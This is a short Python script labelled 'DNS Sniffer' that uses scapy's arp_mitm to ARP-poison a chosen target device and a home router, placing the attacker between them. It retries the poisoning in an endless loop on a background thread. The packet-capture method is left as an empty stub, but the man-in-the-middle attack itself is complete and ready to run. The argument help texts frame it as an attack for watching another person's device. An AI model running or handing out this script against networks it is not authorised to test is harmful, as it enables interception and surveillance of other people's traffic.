import argparse
import threading
from scapy.all import arp_mitm


parser = argparse.ArgumentParser(description='DNS Sniffer')
parser.add_argument('--targetip', help='Target device you want to watch.', required=True)
parser.add_argument('--iface', help='Interface to use for attack', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)

opts = parser.parse_args()


class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ...')
                continue


    def capture(self):
        pass

    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t1.start()

if __name__ == '__main__':
    device = Device(opts.routerip, opts.targetip, opts.iface)
    device.watch()
